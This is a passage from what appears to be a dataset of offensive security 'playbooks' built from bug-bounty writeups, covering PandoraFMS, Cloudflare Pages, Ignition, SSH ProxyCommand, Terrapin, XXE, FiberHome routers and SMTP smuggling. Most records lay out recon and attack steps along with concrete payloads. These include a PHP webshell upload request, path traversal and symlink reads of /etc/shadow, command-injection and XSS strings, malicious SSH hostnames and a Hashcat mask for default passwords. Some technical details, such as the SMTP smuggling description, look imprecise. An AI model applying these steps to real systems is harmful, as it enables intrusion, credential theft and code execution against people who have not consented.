This also bypasses the need for user interaction beyond viewing the page.
playbooks.key_lesson: When configuring IoT devices via a web interface, always sanitize user-controllable inputs such as SSID names to prevent XSS vulnerabilities.

meta.title: Multiple Vulnerabilities in PandoraFMS Enterprise
meta.category: Authentication Bypass, Authorization Bypass, Sensitive Data Exposure, Command Injection, Path Traversal, Unrestricted File Upload, Stored XSS
meta.vuln_type: IDOR | Auth Bypass | RCE | Path Traversal | Unrestricted File Upload | Stored XSS

affected_components: Multiple components, including user management, report generation, file upload functionality, and configuration settings.

trigger_conditions.when_to_apply: This playbook is applicable when an attacker has authenticated access to the PandoraFMS Enterprise instance and can interact with its web interface. Specific vulnerabilities are triggered by certain actions within the application.
prerequisites: Authenticated user session.
applicability_signals: Ability to perform actions like viewing/editing user details, generating reports, uploading files, or accessing configuration pages.
Observing parameters that likely represent user IDs, report IDs, or file paths in requests.
skip_if: No authenticated access possible.
WAF or other security controls prevent exploitation of specific vulnerabilities.

recon_steps: Step 1: Log in with any authenticated user account.
Step 2: Explore the web interface, identify key functionalities like user management, reporting, file uploads, and configuration settings.
Step 3: Intercept requests made during these actions using a proxy (e.g., Burp Suite) and analyze parameters for potential IDs, filenames, or sensitive data.
attack_steps: Step 1 (IDOR - User Enumeration/Access): Send GET requests to endpoints that retrieve user information, substituting the current user's ID with other numeric IDs (e.g., 1, 2, 3...9999).
Step 2 (IDOR - Report Data Access): Send GET requests to report generation endpoints, altering report IDs or user IDs associated with reports.
Step 3 (Unrestricted File Upload): Navigate to file upload sections and attempt to upload various file types, including webshells (e.g., PHP, JSP).
Step 4 (Path Traversal): When uploading files or accessing reports, attempt to manipulate filenames or paths using directory traversal sequences (e.g., ../../etc/passwd).
Step 5 (Stored XSS): Inject XSS payloads into fields that are later displayed in the web interface, such as user profile descriptions or report titles.
Step 6 (Command Injection/RCE): Identify parameters that appear to be used in shell commands or system calls. Inject shell metacharacters and commands (e.g., '; ls -la;', '| whoami').
payloads_or_patterns: Unrestricted File Upload: POST /pandora_console/index.php?sec_passwd=<USER_SESSION_COOKIE>&sec_id=<SESSION_ID>&sec_menu=config&sec_sub=upload_logo Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW --WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name="logo"; filename="webshell.php" Content-Type: application/x-php <?php system($_GET['cmd']); ?> ----WebKitFormBoundary7MA4YWxkTrZu0gW--
tools_recommended: Burp Suite (Proxy, Repeater, Intruder)
ffuf or dirsearch for discovering hidden files/directories
Custom scripts for fuzzing ID parameters.
success_indicators: IDOR: Display of sensitive information (e.g., other users' details, private reports) that the authenticated user should not have access to.
Unrestricted File Upload: Successful upload of a webshell, confirmed by being able to execute commands via the webshell.
Path Traversal: Reading of sensitive system files (e.g., /etc/passwd, /etc/shadow).
Stored XSS: Execution of JavaScript in the browser (e.g., alert box pop-up) when viewing the affected page.
Command Injection/RCE: Execution of arbitrary system commands, observed by command output in the response or unexpected system behavior.
failure_indicators: IDOR: Receiving a 403 Forbidden or 404 Not Found error when attempting to access other users' data, indicating access controls are effective.
File Upload: Upload failure, or the uploaded file is sanitized/rejected.
Path Traversal: Server errors or being restricted to the intended upload directory.
XSS: No JavaScript execution, payload is displayed as plain text.
Command Injection: No command output, or error messages indicating invalid commands. Pivot to other injection points or vulnerabilities.

playbooks.impact: Allows attackers to perform actions such as viewing sensitive user data, accessing unauthorized reports, executing arbitrary code on the server (RCE), reading system files, and potentially achieving full system compromise.
playbooks.key_lesson: Always validate and sanitize all user-supplied input, especially IDs, filenames, and any data that interacts with the file system or command execution, even for authenticated users.

meta.title: Multiple RXSS

trigger_conditions.when_to_apply: When an authenticated user can provide input that is reflected in the response without proper sanitization, and the target application has a broad VDP scope.
prerequisites: Authenticated user session
Target program has a VDP with a broad scope that includes XSS
applicability_signals: URL contains parameters that are reflected in the page content
The presence of a CMS or admin panel often indicates areas where input handling might be less stringent.
skip_if: Input is properly sanitized and encoded before reflection
WAF blocks XSS payloads

recon_steps: Scan the target application for user-controlled input points using Burp Suite crawler.
Explore authenticated sections of the application, particularly admin panels or CMS interfaces, to identify potential reflection points.
attack_steps: Identify a URL that reflects user input, such as *.com/project/someting/fileame.html.
Append an XSS payload to the URL, like </sCrIpT><sCrIpT>alert(1)</sCrIpT>.
Navigate to the modified URL to observe the response.
tools_recommended: Burp Suite: Use the crawler to discover input points and Intruder to fuzz parameters with XSS payloads.
success_indicators: An alert box with '1' pops up in the browser, confirming JavaScript execution.
failure_indicators: No JavaScript execution occurs, and the payload is either encoded or stripped from the response. In this case, try different XSS payloads or test other input vectors.

playbooks.impact: Execution of arbitrary JavaScript code in the context of the victim's browser, potentially leading to session hijacking, credential theft, defacement, or redirecting users to malicious sites.
playbooks.key_lesson: Always test authenticated areas of web applications for reflected XSS vulnerabilities, especially when the program scope is broad and includes VDPs.

meta.title: Finding Insecure TrustManagers and Disabled HostnameVerification with CodeQL
meta.programs: Apache Software Foundation, Opencast, ballerina-platform, openMF

target_profile.technology: Java applications using TrustManager or HostnameVerifier
tech_stack_fingerprints: Java code using TrustManager or HostnameVerifier classes

trigger_conditions.when_to_apply: This playbook is applicable when analyzing Java source code for vulnerabilities related to TLS/SSL certificate validation. It is specifically useful when hunting for Man-in-the-Middle (MiTM) vulnerabilities arising from improperly configured TrustManagers or HostnameVerifiers.
prerequisites: Access to the Java source code of the target application.
applicability_signals: Presence of `TrustManager` or `HostnameVerifier` implementations in the codebase.
Usage of `SSLContext.init()` or similar methods for SSL configuration.
skip_if: The application does not use Java for its TLS/SSL handling.
The codebase has been thoroughly audited and no insecure implementations of TrustManager or HostnameVerifier are present.

recon_steps: Step 1: Clone the target Java project repository.
Step 2: Use CodeQL to analyze the codebase for patterns related to `TrustManager` and `HostnameVerifier` implementations.
Step 3: Identify all instances where `SSLContext.init()` is called with custom `TrustManager` arrays or where `HostnameVerifier` is overridden.
attack_steps: Step 1: Examine `TrustManager` implementations. Look for `checkServerTrusted` methods that do not throw exceptions or have overly permissive logic.
Step 2: Examine `HostnameVerifier` implementations. Look for implementations that always return `true` or bypass hostname checks.
Step 3: If an insecure `TrustManager` or `HostnameVerifier` is found, identify the `SSLContext` initialization point.
Step 4: Determine how the configured `SSLContext` is used to establish HTTPS connections.

Step 5: (For exploitation) If the target makes outbound connections to external services using these insecure configurations, set up a malicious server with a self-signed or invalid certificate and attempt to make the target application connect to it. Monitor for callbacks or responses indicating successful interception.
payloads_or_patterns: Java code snippet for an insecure TrustManager: `class InsecureTrustManager implements X509TrustManager { @Override public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { /* BAD: Does not verify the certificate chain, allowing any certificate. */ } ... }`

Java code snippet for insecure HostnameVerifier (if applicable, not explicitly detailed in writeup but implied): `class InsecureHostnameVerifier implements HostnameVerifier { @Override public boolean verify(String hostname, SSLSession session) { return true; /* BAD: Accepts any hostname */ } }
tools_recommended: CodeQL: For static analysis of Java source code to find vulnerable patterns.
Burp Suite Collaborator / Interactsh: To receive callbacks from potentially exploitable MiTM scenarios.
success_indicators: CodeQL query successfully identifies insecure TrustManager or HostnameVerifier implementations.
In an exploitation scenario, successful interception of TLS traffic or successful callback to an attacker-controlled server indicates a MiTM vulnerability.
failure_indicators: CodeQL query returns no relevant results.
The application strictly validates certificates and hostnames, even with custom configurations, preventing MiTM.
Connections to external services are not made using the vulnerable SSLContext configuration.

playbooks.impact: Allows an attacker to perform Man-in-the-Middle (MiTM) attacks by intercepting and potentially modifying traffic between the vulnerable application and external services. This can lead to the disclosure of sensitive information, session hijacking, or unauthorized actions.
playbooks.key_lesson: When reviewing Java code, always statically analyze TLS/SSL configurations for insecure implementations of `TrustManager` and `HostnameVerifier` that bypass certificate validation, as these are prime targets for Man-in-the-Middle attacks.

meta.title: Hacking Cloudflare Pages part 2

trigger_conditions.when_to_apply: When the target allows custom redirects or headers in a Cloudflare Pages project, and the build process is susceptible to symlink manipulation or path traversal in API requests.
prerequisites: User must have an authenticated session with Cloudflare Pages.
User must be able to configure custom redirects or headers for their project.
The build system must process user-defined files like _redirects or _headers as root.
The API endpoint structure (e.g., /client/v4/accounts/.../storage/kv/namespaces/...) must be observable.
applicability_signals: Ability to configure _redirects or _headers files in a Cloudflare Pages project.
API responses containing account and namespace UUIDs that can be manipulated.
The build system processes _redirects or _headers as root.
skip_if: The build system properly validates that _redirects and _headers files are not symlinks.
API requests are strictly validated against the authenticated user's account and namespace UUIDs without allowing traversal.

recon_steps: Step 1: Deploy a Cloudflare Pages project with custom _redirects or _headers files.
Step 2: Observe the build process logs for any indication of file processing as root.
Step 3: Identify the API endpoints used for managing build artifacts and logs. Intercept traffic using a proxy like Burp Suite.
attack_steps: Step 1: Create a malicious _redirects or _headers file in the repository, e.g., `ln -s /etc/shadow _redirects`. (Note: this specific step is mentioned as fixed, but demonstrates the principle).
Step 2: Trigger a build to observe if the symlink is followed and the target file is exfiltrated to the build results.
Step 3: Identify API calls related to accessing build logs or storage. These will typically contain account and namespace UUIDs.

Step 4: Craft a request to the internal API, for example, `https://api.pages.cloudflare.com/client/v4/accounts/<TARGET_ACCOUNT_ID>/storage/kv/namespaces/<MALICIOUS_NAMESPACE_ID>/..%2F..%2F..%2F..%2F..%2F..%2Faccounts/<TARGET_ACCOUNT_ID>%2Fstorage/kv/namespaces/<TARGET_NAMESPACE_ID>/keys` to traverse directories and access sensitive data.
Step 5: Analyze the response for exfiltrated data such as API keys, build artifacts, or other sensitive information.
tools_recommended: Burp Suite: Intercept and modify API requests, analyze responses.
Cloudflare Pages CLI (wrangler): To understand build processes and environment variables.
success_indicators: The build results panel displaying the content of sensitive files (e.g., /etc/shadow if the symlink method were still viable).
API responses containing sensitive information such as API keys for other users' GitHub accounts, build artifacts, or internal configuration details.
Successful retrieval of data that should be inaccessible to the authenticated user.
failure_indicators: Builds failing with errors related to file permissions or symlinks.
API requests returning 403 Forbidden or 404 Not Found for attempts to access unauthorized data.
API responses indicating that the account and namespace UUIDs are strictly validated and do not allow for traversal.

playbooks.impact: Access to sensitive files on the build system (potentially as root), exfiltration of API keys for other users' accounts, access to internal API data and build artifacts, potential for further exploitation and arbitrary code execution.
playbooks.key_lesson: When processing user-controlled files in a build system, always validate file types and paths to prevent symlink attacks and path traversal vulnerabilities, especially if processed with elevated privileges.

meta.title: DoubleTrouble

trigger_conditions.when_to_apply: This technique is applicable when the target is running a vulnerable version of Inductive Automation Ignition software, specifically versions 8.1.22 to 8.1.24.
prerequisites: Target is running Inductive Automation Ignition version 8.1.22, 8.1.23, or 8.1.24.
applicability_signals: Target software version matches the known vulnerable range.
skip_if: Target Ignition version is outside the range 8.1.22-8.1.24.

recon_steps: Step 1: Identify the target system running Inductive Automation Ignition.
Step 2: Determine the specific version of Ignition software running on the target. This can often be found in the UI footer, about pages, or through banner grabbing if available.
attack_steps: Step 1: Craft a malicious Java serialization payload using the `ysoserial` tool or a similar gadget chain generator.
Step 2: Identify an endpoint or mechanism on the Ignition server that accepts serialized Java objects.
Step 3: Send the crafted malicious payload to the identified endpoint/mechanism.
Step 4: Observe for signs of remote code execution.
payloads_or_patterns: Payloads generated using ysoserial targeting common Java deserialization gadgets, tailored for the target environment. The specific gadget chain will depend on the available classes in the Ignition server's classpath.
tools_recommended: ysoserial: For generating Java deserialization payloads.
Burp Suite: To intercept and modify requests, and to identify potential endpoints that accept serialized data.
success_indicators: Successful execution of commands on the target server (e.g., creating a file, executing a reverse shell command).
Reverse shell connection established from the target server to the attacker's machine.
failure_indicators: No command execution observed, no reverse shell established. This could indicate a patched version, a WAF blocking the payload, or an incorrect gadget chain. Pivot to checking for other vulnerabilities or confirming version again.

playbooks.impact: Remote attackers can execute arbitrary code on the target server without authentication. This can lead to full system compromise, data exfiltration, unauthorized control, and further network lateral movement.
playbooks.key_lesson: Always test Java deserialization endpoints for known vulnerabilities, especially when dealing with Java-based applications like Inductive Automation Ignition, and leverage tools like ysoserial for payload generation.

meta.title: Advisory CVE-2023-43042 – IBM Backup Products Superuser Information Disclosure

target_profile.technology: IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem, IBM Storage Virtualize

trigger_conditions.when_to_apply: When targeting IBM backup or storage products running version 8.3.1, and the system is accessible over the network.
prerequisites: Target system is running version 8.3.1 of the affected IBM products.
applicability_signals: Network accessibility to the /login endpoint of the target IBM product.
skip_if: Product version is later than 8.3.1, as IBM states it's impossible for the default password to still be configured.
WAF or network controls block access to the /login endpoint.

recon_steps: Step 1: Attempt to access the /login endpoint of the target IBM product via GET request to identify the web server's response.
attack_steps: Step 1: Send an unauthenticated GET request to the /login endpoint of the target IBM product (e.g., `GET <TARGET_URL>/login`).
tools_recommended: curl: `curl -v <TARGET_URL>/login`
Burp Suite: Send unauthenticated GET request to /login
success_indicators: HTTP response contains JSON indicating the status of the superuser password change, specifically the presence of the key 'superuserPasswordChanged' with a boolean value.
HTTP response contains `"superuserPasswordChanged":true` indicating the default password is still in use.
HTTP response contains `"superuserPasswordChanged":false` indicating the default password has been changed.
failure_indicators: 404 Not Found or other error codes indicate the /login endpoint is not accessible or is different. Pivot: Investigate other known administrative endpoints.
Response does not contain 'superuserPasswordChanged' key. Pivot: The vulnerability may not be present, or the response structure is different. Check other potential information disclosure points.

playbooks.impact: An unauthenticated attacker can determine if the default superuser password has been changed on critical IBM backup and storage products. This information can be used to prioritize attacks against systems that are more likely to be vulnerable due to the default password still being in use, potentially leading to unauthorized access and compromise of business-critical assets with superuser permissions.
playbooks.key_lesson: Always test unauthenticated endpoints for information disclosure related to authentication mechanisms, especially default credentials, as this can reveal critical system states.

meta.title: SSH ProxyCommand == unexpected code execution (CVE-2023-51385)

affected_components: ProxyCommand directive in ssh client configuration
tech_stack_fingerprints: Presence of ssh client configuration files (~/.ssh/config)

trigger_conditions.when_to_apply: When an attacker can control the hostname or a value that is passed to the ProxyCommand directive in an SSH client configuration file, and that value is not properly sanitized before being used in a shell command.
prerequisites: Attacker can influence a value used in `ProxyCommand` (e.g., via a controlled hostname in a server response or by directly editing `~/.ssh/config`).
The `ProxyCommand` directive is configured to use a shell command that interprets special characters (like backticks, semicolons, etc.).
applicability_signals: SSH client configuration file (`~/.ssh/config`) contains a `ProxyCommand` directive.
The `ProxyCommand` directive uses tokens like `%h` (hostname) or `%p` (port) which are derived from potentially untrusted sources.
The command within `ProxyCommand` is enclosed in single quotes but an attacker-controlled hostname can contain a single quote.
The `ProxyCommand` directive is used by services like Git, Cloudflare One, Google IAP, AWS Systems Manager, or Tor tunneling.
skip_if: The `ProxyCommand` directive is not used.
All inputs to the `ProxyCommand` directive are strictly sanitized and do not allow shell meta-characters.
The SSH client version is known to be patched against CVE-2023-51385 (OpenSSH >= 9.6p1).

recon_steps: Step 1: Inspect the SSH client configuration file (`~/.ssh/config`) for `ProxyCommand` directives.
Step 2: Identify if any `ProxyCommand` directives use tokens like `%h` or `%p` and if these tokens are sourced from external or untrusted inputs.
attack_steps: Step 1: Modify the SSH client configuration (`~/.ssh/config`) to include a vulnerable `ProxyCommand` directive.

Step 2: Craft a malicious hostname (or other controllable input) that contains shell metacharacters (e.g., backticks, semicolons, pipes) or can break out of quoting (e.g., `'; calc;'` or `` `calc` ``).
Step 3: Attempt to connect to a target using the modified configuration, providing the malicious input as the hostname.
Step 4: Observe if the shell command within `ProxyCommand` executes the malicious payload.
payloads_or_patterns:
Example vulnerable `~/.ssh/config` entry: `Host vulnerable.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p`
Malicious hostname for the above: `` `calc` `` (will attempt to execute `calc`)
Malicious hostname for the above: `'; /usr/bin/xcalc;'` (will attempt to execute `/usr/bin/xcalc`)

Example with single quotes: `Host vulnerable.example.com
  ProxyCommand '/usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p'`
Malicious hostname to break single quotes: `'; calc;'`
tools_recommended: Text editor: For modifying `~/.ssh/config`.
SSH client: To initiate the connection.
Malicious command executor: e.g., `calc` on macOS, `xcalc` on Linux, or a netcat listener to confirm payload execution.
success_indicators: A command specified in the `ProxyCommand` payload (e.g., `calc`, `xcalc`) is executed on the attacker's machine or the SSH client's machine.
A network connection is established to an unexpected destination or port as a result of the executed command.
Successful exfiltration of data via the executed command.
failure_indicators: The SSH connection fails with an error indicating invalid hostname or command syntax.
The `ProxyCommand` directive executes literally without any shell interpretation (e.g., the malicious string is treated as a literal hostname).
The SSH client is updated to a patched version (>= 9.6p1) and does not exhibit the vulnerability.

playbooks.impact: Remote code execution on the system where the SSH client is run, allowing an attacker to execute arbitrary commands with the privileges of the SSH client process.
playbooks.key_lesson: Always sanitize untrusted input used within shell commands, especially when those commands are part of critical system utilities like SSH `ProxyCommand`.

meta.title: One Supply Chain Attack to Rule Them All - Poisoning GitHub's Runner Images

tech_stack_fingerprints: workflows specifying 'runs-on: ubuntu-latest', 'runs-on: macos-latest', or 'runs-on: windows-latest'

trigger_conditions.when_to_apply: When a public repository is configured to use GitHub's hosted runners, and there's a mechanism to influence the runner image update process.
prerequisites: Vulnerability in the runner image update process or a way to inject malicious code into the update pipeline.
applicability_signals: Observation of the 'actions/runner-images' repository.
Understanding that GitHub Actions builds run on hosted runners.
Knowledge that runner images are updated weekly.
skip_if: The target does not utilize GitHub Actions hosted runners.
No vulnerability exists in the runner image update process.

recon_steps: Step 1: Identify public GitHub repositories that heavily rely on GitHub Actions for their CI/CD pipeline.
Step 2: Analyze the 'actions/runner-images' repository on GitHub to understand the runner image build and update process.

Step 3: Investigate how runner images are constructed and if there are any potential injection points or misconfigurations in the update pipeline (e.g., in the source code repository itself or associated build infrastructure).
attack_steps: Step 1: (Conceptual) Identify a vulnerability that allows for code injection into the runner image build process.
Step 2: (Conceptual) Craft and inject malicious code into the runner image build pipeline. This could involve modifying build scripts, dependencies, or the final image content.

Step 3: (Conceptual) Leverage the compromised runner image to execute malicious actions within the build environments of other GitHub users. This could include exfiltrating secrets, compromising further infrastructure, or injecting malicious code into downstream projects.
payloads_or_patterns: Insufficient detail in writeup. The writeup describes the *potential* for code injection but does not provide specific payloads or exploit code used.
tools_recommended: Git: To clone and analyze the 'actions/runner-images' repository.
Code analysis tools: To understand the runner image build scripts and identify potential vulnerabilities.
Burp Suite (or similar proxy): Potentially for intercepting and analyzing network traffic during any interactions with GitHub's infrastructure, though not explicitly mentioned in the writeup.
success_indicators: Unauthorized access to internal GitHub infrastructure or secrets.
Malicious code being present in GitHub's hosted runner base images.
Downstream projects using these compromised images exhibiting unexpected behavior or security incidents.
failure_indicators: WAF blocking requests to GitHub infrastructure.
Runner image build process failing to incorporate injected code.
No observable signs of compromise in downstream projects.
If the writeup implies the vulnerability was fixed, then attempts to reproduce the exact historical vulnerability may fail.

playbooks.impact: Compromise of GitHub's hosted runner images could lead to a widespread supply chain attack, enabling an attacker to inject malicious code into virtually any project that utilizes GitHub Actions for building. This could result in widespread system compromise, data exfiltration, and further downstream attacks.
playbooks.key_lesson: Thoroughly investigate the integrity and security of CI/CD build systems and their update pipelines, as they represent critical supply chain attack vectors.

meta.title: That time I broke into an API and became a billionaire

affected_components: All API endpoints that were reconfigured to accept 'application/xml'
tech_stack_fingerprints: API configured to accept 'application/json' and later 'application/xml' Content-Types
Automated tests verifying Content-Type returns 415 (Unsupported Media Type)

trigger_conditions.when_to_apply: When an API endpoint that typically only accepts 'application/json' has been reconfigured to also accept 'application/xml' without proper validation.
prerequisites: Ability to send requests to the target API with an authenticated session.
applicability_signals: Observed API endpoints responding with 415 (Unsupported Media Type) when using Content-Type other than 'application/json' previously.
Discovery of new endpoints or API functionalities that might involve different data formats (e.g., integration with third-party services requiring XML).
skip_if: WAF or API gateway strictly enforces JSON-only Content-Types across all endpoints.
The target explicitly validates XML payloads for malicious entities or constructs.

recon_steps: Step 1: Intercept requests to the API using a proxy (e.g., Burp Suite) and observe the Content-Type headers of typical requests.
Step 2: Attempt to send requests with 'application/xml' as the Content-Type to various API endpoints, noting the response codes.
attack_steps: Step 1: Identify an API endpoint that previously returned 415 for non-JSON Content-Types but now accepts 'application/xml'.
Step 2: Craft an XML payload containing an XXE vulnerability. A common test is to attempt to read local files (e.g., /etc/passwd).
Step 3: Send the crafted XML payload with the 'application/xml' Content-Type to the identified endpoint.
Step 4: Monitor for the XXE vulnerability's impact, such as the content of local files appearing in the response, or a callback to an external server if external entities are used in the XXE payload.
tools_recommended: Burp Suite: To intercept requests, modify Content-Type headers, and craft XML payloads.
Custom script (Python/Bash): To automate testing multiple endpoints with different XXE payloads.
success_indicators: Response contains sensitive information from local files (e.g., content of /etc/passwd).
A request to an external server (e.g., Burp Collaborator) is observed when attempting to exfiltrate data via external XML entities.
failure_indicators: All requests with 'application/xml' result in a 415 (Unsupported Media Type) or 400 (Bad Request) without any sensitive data leakage.
The API sanitizes or rejects XML payloads containing entity declarations.

playbooks.impact: Unauthorized access to sensitive files on the server, potentially leading to further system compromise, data theft, or remote code execution.
playbooks.key_lesson: Always verify Content-Type handling configurations, especially after changes related to integrating with third-party services, as seemingly minor adjustments can have broad security implications across existing endpoints.

meta.title: Hacking ISP CPE equipment: FiberHome

tech_stack_fingerprints: Default password format (8 lowercase hex characters, starts with 4 letters, then 4 numbers)

trigger_conditions.when_to_apply: When the target device is a FiberHome AN5506-02-FG (or similar models from the same vendor) and its default Wi-Fi password or administration password is still in use.
prerequisites: Physical access or network access to the device to read stickers or observe network traffic.
applicability_signals: Sticker on the device showing a password format of 8 lowercase hex characters, starting with 4 letters and ending with 4 numbers.
Information or screenshots from other users indicating similar default password patterns.
skip_if: The device has been reconfigured with a strong, custom password.
The vendor has updated their password generation algorithm to be more secure.

recon_steps: Step 1: Inspect the physical sticker on the FiberHome AN5506-02-FG device for MAC address, serial number, and default password.
Step 2: If the password follows the pattern of 8 lowercase hex characters (4 letters + 4 numbers), note this pattern.
attack_steps: Step 1: Use a GPU cracking tool (e.g., Hashcat) to brute-force the Wi-Fi or administration password based on the observed pattern.
Step 2: The attack involves generating all possible combinations of 4 lowercase hex characters followed by 4 numeric characters.
payloads_or_patterns: Password pattern: ^[a-f]{4}[0-9]{4}$ (for hex characters, assuming lowercase a-f)
tools_recommended: Hashcat: configured to brute-force a custom mask representing the observed password pattern.
Custom script for generating password candidates if a specific tool mask is not readily available.
success_indicators: Successful login to the device's web administration interface.
Successful connection to the Wi-Fi network using the cracked password.
failure_indicators: Hashcat reports no found passwords after a significant period of time (e.g., 1-2 days on a suitable GPU).
Login attempts with generated passwords fail consistently.
Pivot suggestion: If this specific pattern fails, investigate other potential weak password implementations or look for default credential lists for FiberHome devices.

playbooks.impact: An attacker can gain administrative access to the ISP-provided router, allowing them to monitor network traffic, redirect users to malicious sites, change DNS settings, or use the device as a pivot point into the user's internal network. For Wi-Fi, it allows unauthorized access to the user's internet connection.
playbooks.key_lesson: Always attempt to crack default credentials, especially when observing predictable or simple patterns in password generation, as this can lead to widespread compromise of user devices.

meta.title: Terrapin Attack: Breaking SSH Channel Integrity By Sequence Number Manipulation
meta.authors: Fabian Bäumer, Marcus Brinkmann, Jörg Schwenk
meta.vuln_type: Man-in-the-Middle | Prefix Truncation Attack | Protocol Downgrade

trigger_conditions.when_to_apply: This attack is applicable when an attacker has Man-in-the-Middle (MitM) capabilities at the network layer and the SSH connection negotiates specific encryption and MAC modes.
prerequisites: Attacker must have network layer MitM capabilities.
SSH connection must negotiate either ChaCha20-Poly1305 or CBC with Encrypt-then-MAC.
applicability_signals: SSH server or client vulnerable to prefix truncation.
Negotiation of `chacha20-poly1305@openssh.com` or CBC ciphers with `-etm@openssh.com` MAC.
skip_if: No MitM capability.
SSH connection uses encryption modes not vulnerable to prefix truncation (e.g., AES-GCM without specific vulnerable implementations).
SSH server/client has implemented the 'strict kex' countermeasure.

recon_steps: Step 1: Intercept SSH traffic between client and server using a network sniffing tool (e.g., Wireshark) or by setting up a proxy.
Step 2: Analyze the SSH handshake to identify negotiated encryption and MAC algorithms. Look for `chacha20-poly1305@openssh.com` or CBC ciphers with `-etm@openssh.com`.
attack_steps: Step 1: As an MitM, intercept the SSH handshake packets.
Step 2: Carefully manipulate sequence numbers during the handshake. Inject an ignored packet to offset sequence numbers.
Step 3: Truncate specific messages (e.g., the EXT_INFO message) from the transcript without detection.
Step 4: Leverage the truncated transcript to perform further attacks, such as downgrading security extensions, disabling countermeasures, or performing unauthorized authentication/actions.
Step 5: Observe the client/server behavior for signs of successful exploitation (e.g., unexpected authentication, altered session parameters).
payloads_or_patterns: Custom packet manipulation scripts or tools that can modify sequence numbers and drop packets during the SSH handshake.
Exploitation of AsyncSSH state machine flaws after successful Terrapin attack (requires specific proof-of-concept).
tools_recommended: Wireshark: For intercepting and analyzing SSH traffic.
Scapy: For crafting and sending custom network packets to manipulate the handshake.
Go SSH scanner provided by the authors: To check for vulnerable encryption modes and 'strict kex' countermeasure support.
success_indicators: Client authenticates with an unexpected user account without user interaction.
SSH extension negotiation is downgraded to less secure options.
Keystroke timing attack countermeasures are deactivated in OpenSSH 9.5.
Successful phishing attacks or unauthorized actions performed within the session.
Unexpected session parameters or behavior observed post-handshake.
failure_indicators: SSH handshake fails with sequence number mismatch errors.
Connection is terminated abruptly during the handshake.
No detectable change in authentication methods or session security despite attack attempts (indicates 'strict kex' or unaffected crypto is in use).
Error messages related to packet integrity or MAC failures.

playbooks.impact: An attacker can downgrade the security of an SSH connection by truncating extension negotiation messages, leading to weaker client authentication (e.g., RSA public key authentication), deactivation of keystroke timing attack countermeasures, and enabling phishing attacks. In specific implementations like AsyncSSH, it can allow an attacker to sign a victim's client into another account, granting Man-in-the-Middle capabilities within the encrypted session.
playbooks.key_lesson: When performing MitM on SSH traffic, analyze the handshake for negotiated encryption and MAC modes, as specific combinations can be vulnerable to prefix truncation attacks, leading to security downgrades and unauthorized actions.

meta.title: CVE-2023-6483: Improper/missing API authentication in ADiTaaS v5.1

affected_components: API endpoints accessible via user ID in URL

trigger_conditions.when_to_apply: When an authenticated user can identify or guess a 'userId' parameter within API requests, especially if it's directly embedded in the URL.
prerequisites: Attacker must have an authenticated session with the target application.
applicability_signals: Observation of user IDs in API request URLs.
Angular-based application structure, suggesting client-side logic might expose API endpoints.
The presence of local storage variables like 'IsLoginDone' and 'ObjLoginData' after login.
skip_if: API endpoints are properly secured with robust authentication and authorization checks beyond just the user ID in the URL.

recon_steps: Step 1: Analyze the client-side JavaScript (Angular code) of the ADiTaaS application to identify all API endpoints used.
Step 2: Observe the structure of API requests, paying close attention to parameters within the URL that represent user identifiers (e.g., '/api/users/<userId>/data').
Step 3: Examine browser local storage for session-related information after logging in, noting keys like 'IsLoginDone' and 'ObjLoginData'.
attack_steps: Step 1: After logging in with a regular user account, identify an API endpoint that includes the authenticated user's ID in the URL (e.g., GET /api/v1/users/<current_user_id>/profile).
Step 2: Intercept this request and modify the user ID in the URL to a different, potentially administrative, user ID (e.g., by guessing '1' or enumerating common IDs).
Step 3: Forward the modified request.
Step 4: Observe the response for signs of unauthorized access to another user's data or elevated privileges.
payloads_or_patterns: Modify the 'userId' value in the ObjLoginData JSON in local storage to a target user ID and reload the page.
tools_recommended: Burp Suite (or similar proxy) for intercepting and modifying requests.
Browser Developer Tools (specifically for inspecting JavaScript and local storage).
success_indicators: Receiving a successful response (e.g., 200 OK) from the modified API request.
The response contains data belonging to the target user (e.g., administrative settings, other users' information).
Gaining access to administrative dashboards or functionalities not available to the original authenticated user.
failure_indicators: Receiving a 401 Unauthorized or 403 Forbidden error for requests with modified user IDs. This suggests that user ID is not the sole or primary authorization mechanism.
The API endpoint might be properly secured with session-based or role-based access control, making simple ID manipulation ineffective. In this case, pivot to other potential vulnerabilities.

playbooks.impact: An attacker can gain system administrator access to customer instances, enabling them to access, modify, or delete all API resources and sensitive data associated with any customer. This can lead to a full compromise of the affected customer's environment.
playbooks.key_lesson: API endpoints that use user IDs directly in the URL for access control are highly susceptible to broken access control vulnerabilities. Always validate user permissions on the server-side for every API request, regardless of client-side logic.

meta.title: SMTP Smuggling - Spoofing E-Mails Worldwide

trigger_conditions.when_to_apply: When an attacker can send emails through an SMTP server that does not properly handle the end of email transmission commands, allowing arbitrary data to be injected as a new email.
prerequisites: Attacker must have network access to an SMTP server capable of sending emails to external recipients.
The target SMTP server must be vulnerable to the specific smuggling technique (e.g., not correctly parsing ENVID or other termination indicators).
applicability_signals: SMTP server responds with a 2xx success code to `MAIL FROM` and `RCPT TO` commands.
SMTP server does not immediately reject commands that could be interpreted as part of a new email after a previous email transaction has seemingly completed.
skip_if: SMTP server aggressively rejects any malformed commands or sequences that deviate from standard SMTP transaction flows.
SMTP server requires specific authentication credentials that the attacker cannot obtain.

recon_steps: Step 1: Identify publicly accessible SMTP servers (port 25) that accept mail for relay. Use tools like Nmap to scan for open SMTP ports.
Step 2: Connect to the identified SMTP server using a telnet client or netcat and observe the banner responses. Look for variations in banner text that might indicate different mail server software.
Step 3: Initiate a basic SMTP transaction (MAIL FROM, RCPT TO, DATA) to understand the server's basic behavior and response codes.
attack_steps: Step 1: Initiate an SMTP connection to the target mail server.
Step 2: Send a `MAIL FROM` command with a desired sender address (e.g., `MAIL FROM: <attacker_controlled_email>@example.com`).
Step 3: Send a `RCPT TO` command with a desired recipient address (e.g., `RCPT TO: <victim_email>@example.com`).
Step 4: Send the `DATA` command.

Step 5: After the server prompts for data, send the email headers and body. Crucially, include a newline character followed by a specially crafted sequence that the vulnerable server misinterprets as the end of the email, but which actually signals the start of a *new* email transaction. The specific sequence depends on the vulnerability (e.g., a sequence that looks like an end-of-data marker but isn't, or a sequence that exploits a parsing flaw in how ENDQ/QUIT/RSET are handled).

